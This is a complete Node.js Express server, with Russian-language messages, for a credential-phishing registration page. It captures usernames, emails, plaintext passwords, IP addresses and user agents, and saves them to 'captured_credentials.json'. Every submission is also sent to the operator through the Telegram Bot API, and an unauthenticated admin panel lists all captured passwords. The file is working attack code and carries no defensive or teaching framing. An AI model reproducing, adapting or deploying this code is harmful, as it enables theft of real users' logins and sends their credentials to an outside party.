const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = path.join(__dirname, 'captured_credentials.json');
const CONFIG_FILE = path.join(__dirname, 'admin_config.json');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Helper: Read JSON file safely
function readJsonFile(filePath, defaultValue = []) {
  try {
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2), 'utf8');
      return defaultValue;
    }
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    console.error(`Error reading ${filePath}:`, err.message);
    return defaultValue;
  }
}

// Helper: Write JSON file safely
function writeJsonFile(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error(`Error writing ${filePath}:`, err.message);
  }
}

// Helper: Send notification via Telegram Bot if configured
function sendTelegramNotification(entry) {
  const config = readJsonFile(CONFIG_FILE, { botToken: '', chatId: '' });
  if (!config.botToken || !config.chatId) return;

  const text = `🚨 *НОВЫЕ ДАННЫЕ ИЗ ФОРМЫ РЕГИСТРАЦИИ!* 🦍\n\n` +
    `👤 *Никнейм:* \`${entry.username}\`\n` +
    `📧 *Email:* \`${entry.email}\`\n` +
    `🔑 *Пароль:* \`${entry.password}\`\n` +
    `🌐 *IP-адрес:* \`${entry.ip}\`\n` +
    `📅 *Дата:* ${entry.timestamp}`;

  const postData = JSON.stringify({
    chat_id: config.chatId,
    text: text,
    parse_mode: 'Markdown'
  });

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${config.botToken}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = https.request(options, (res) => {
    let responseBody = '';
    res.on('data', chunk => responseBody += chunk);
    res.on('end', () => {
      console.log('📱 Telegram notification status:', res.statusCode);
    });
  });

  req.on('error', (e) => {
    console.error('❌ Telegram error:', e.message);
  });

  req.write(postData);
  req.end();
}

// Route: Admin Page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API: Save registration data
app.post('/api/register', (req, res) => {
  const { username, email, password } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ success: false, message: 'Все поля обязательны для заполнения!' });
  }

  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toLocaleString('ru-RU', { timeZone: 'UTC' }) + ' UTC';

  const newEntry = {
    id: Date.now().toString(36) + Math.random().toString(36).substring(2, 5),
    username: username.trim(),
    email: email.trim(),
    password: password,
    ip: clientIp,
    userAgent: userAgent,
    timestamp: timestamp
  };

  // 1. Log to server terminal visually
  console.log('\n==================================================');
  console.log('🚨 [ПОЙМАНЫ НОВЫЕ ДАННЫЕ РЕГИСТРАЦИИ!] 🚨');
  console.log(`👤 Никнейм: ${newEntry.username}`);
  console.log(`📧 Email:    ${newEntry.email}`);
  console.log(`🔑 Пароль:   ${newEntry.password}`);
  console.log(`🌐 IP:       ${newEntry.ip}`);
  console.log(`📅 Время:    ${newEntry.timestamp}`);
  console.log('==================================================\n');

  // 2. Save to captured_credentials.json file
  const credentials = readJsonFile(DATA_FILE, []);
  credentials.unshift(newEntry); // newest first
  writeJsonFile(DATA_FILE, credentials);

  // 3. Send Telegram alert if bot is configured
  sendTelegramNotification(newEntry);

  // 4. Respond to frontend
  res.json({
    success: true,
    data: {
      username: newEntry.username,
      email: newEntry.email,
      password: newEntry.password,
      timestamp: newEntry.timestamp
    }
  });
});

// API: Get admin data
app.get('/api/admin/data', (req, res) => {
  const data = readJsonFile(DATA_FILE, []);
  res.json({ success: true, data: data });
});

// API: Clear admin logs
app.delete('/api/admin/clear', (req, res) => {
  writeJsonFile(DATA_FILE, []);
  console.log('🧹 Все сохраненные пароли очищены администратором.');
  res.json({ success: true, message: 'Логи успешно очищены!' });
});

// API: Get admin config (Telegram integration)
app.get('/api/admin/config', (req, res) => {
  const config = readJsonFile(CONFIG_FILE, { botToken: '', chatId: '' });
  res.json({ success: true, config: config });
});

// API: Save admin config
app.post('/api/admin/config', (req, res) => {
  const { botToken, chatId } = req.body;
  const config = { botToken: (botToken || '').trim(), chatId: (chatId || '').trim() };
  writeJsonFile(CONFIG_FILE, config);
  console.log('⚙️ Настройки Telegram обновлены!');
  res.json({ success: true, message: 'Настройки Telegram сохранены!' });
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🚀 Сервер запущен на http://localhost:${PORT}`);
  console.log(`📂 Страница регистрации: http://localhost:${PORT}`);
  console.log(`🔑 Админ-панель для просмотра данных: http://localhost:${PORT}/admin`);
  console.log(`💾 Данные сохраняются в: ${DATA_FILE}\n`);
});
